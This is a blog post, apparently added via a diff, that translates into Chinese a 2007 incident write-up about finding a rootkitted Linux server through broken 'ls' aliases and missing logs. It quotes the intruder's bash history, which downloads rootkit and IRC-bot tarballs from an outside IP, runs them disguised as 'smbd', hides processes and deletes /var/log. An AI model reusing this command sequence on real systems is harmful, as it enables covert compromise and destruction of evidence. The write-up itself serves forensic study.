@@ -1,0 +1,152 @@
+---
+layout: post
+title: "Holiday cracking 翻译"
+description: ""
+category: 渗透测试
+tags: [linux,rootkit]
+---
+{% include JB/setup %}
+
+
+原文:http://blog.larsstrand.no/2007/04/holiday-cracking.html
+
+比较老的文章了.国内几个大牛的博客都见到过转载原文的,貌似没见到有翻译版.
+
+## 翻译 ##
+
+最近有个朋友让我去帮他看一下他的linux服务器.说是apache启动不了,有很多诡异的情况.后来证明绝不是apache启动不了这么简单.
+
+登上服务器之后随便看了下,最先引起我注意的是"ls"命令的输出:
+
+	lars@server1:~$ ls
+	ls: invalid option -- h
+	Try `ls --help' for more information.
+
+为什么"ls"默认加了"-h"参数呢?我用"alias"命令看了一下,然后取消了这个别名之后"ls"就工作正常了.
+
+	lars@server1:~$ alias ls
+	alias ls='ls -sh --color=auto'
+	lars@server1:~$ unalias ls
+	lars@server1:~$ ls
+	backup
+	lars@server1:~$
+
+虽然很奇怪,不过我的首要任务是先把apache启动起来,等过会再仔细研究这个问题.
+
+	lars@server1:~$ sudo /etc/init.d/apache2 start
+	Password:
+	 * Starting apache 2.0 web server...
+	(2): apache2: could not open error log file /var/log/apache2/error.log.
+	Unable to open logs
+	 ...fail!
+
+纳尼?赶紧去"/var/log/"目录一看,果然"apache2/"文件夹不见了.而且这个目录下其他的文件夹,比如"mysql/","samba/"也都不见了.一定是哪里出错了.会不会是我朋友不小心删掉了呢,他跟我说绝对没有.然后我用root登录进去准备修复日志丢失的问题.
+
+	lars@server1:~$ sudo -i
+	Password:
+	root@server1:~# ls
+	ls: unrecognized prefix: do
+	ls: unparsable value for LS_COLORS environment variable
+	total 44
+	  4 .                 4 .bashrc           4 .ssh
+	  4 ..                4 .lesshst          8 .viminfo
+	  8 .bash_history     4 .profile          4 .vimrc
+
+很不幸的发现,"ls"又出问题了.同样,用"alias"命令:
+
+	root@server1:~# alias ls
+	alias ls='ls -sa --color=auto'
+	root@server1:~# unalias ls
+	root@server1:~# ls
+	root@server1:~#
+
+这个时候,我才意识到问题的严重性."ls"奇怪的举动和"/var/log/"大量日志被删除让我怀疑服务器是否被入侵了.当我看到root目录下的".bash_history"时,我就傻眼了.
+
+root@server1:~# cat -n .bash_history
+	   ...
+	   340  w
+	   341  cd /var
+	   342  wget http://83.19.148.250/~matys/pliki/shv5.tar.gz
+	   343  tar -zxf shv5.tar.gz
+	   344  rm -rf shv5.tar.gz
+	   345  mv shv5 .x
+	   346  cd .x
+	   347  ./setup zibi.joe.149 54098
+	   348  passwd
+	   349  passwd
+	   350  ps aux
+	   351  crontab -l
+	   352  cat /etc/issue
+	   353  cat /etc/passwd
+	   354  w
+	   355  who
+	   356  cd /usr/lib/libsh
+	   357  ls
+	   358  hide +
+	   359  chmod +x hide
+	   360  hide +
+	   361  ./hide +
+	   362  cd /var/.x
+	   363  mkdir psotnic
+	   364  cd psotnic
+	   365  wget http://83.19.148.250/~matys/pliki/psotnic0.2.5.tar.gz
+	   366  tar -zxf psotnic0.2.5.tar.gz
+	   367  rm -rf psotnic0.2.5.tar.gz
+	   368  ls
+	   369  mv psotnic-0.2.5-linux-static-ipv6 synscan
+	   370  ./synscan
+	   371  vi conf
+	   372  vi conf1
+	   373  mv synscan smbd
+	   374  smbd -c conf
+	   375  ls
+	   376  ps aux
+	   377  ls
+	   378  ./smbd -c conf
+	   379  ./smbd -c conf1
+	   380  ./smbd conf
+	   381  ./smbd conf1
+	   382  ./smbd -a conf conf1
+	   383  rm -rf conf.dec
+	   384  rm -rf conf1.dec
+	   385  cd /usr/lib/libsh
+	   386  ./hide +
+	   387  exit
+	   ...
+	   425  ssh ftp@62.101.251.166
+	   426  w
+	   427  ls
+	   428  ls
+	   429  cd /var/.x
+	   430  ls
+	   431  cd psotnic/
+	   432  ls
+	   433  rm -rf /var/log/*
+	   434  exit
+	   435  ls
+	   436  cd /var/.x/psotnic/
+	   437  ls
+	   438  vi conf2
+	   439  ./smbd -c conf2
+	   440  ./smbd conf2
+	   441  ./smbd -a conf conf1 conf2
+	   442  rm -rf conf2.dec
+	   443  cd ..
+	   444  ls
+	   445  cd /usr/lib/libsh
+	   446  hide +
+	   447  ./hide +
+	   448  exit
+	   449  ps aux
+	   450  cd /var/.x
+	   451  ls
+	   452  ls
+	   453  cd psotnic/
+	   454  ls
+	   455  cat pid.MastaH
+	   456  kill -9 2030
+	   457  ./synscan -a conf conf1
+	   458  ./smbd -a conf conf1
+	   459  cd /usr/lib/libsh
+	   460  ./hide +
+	  ...
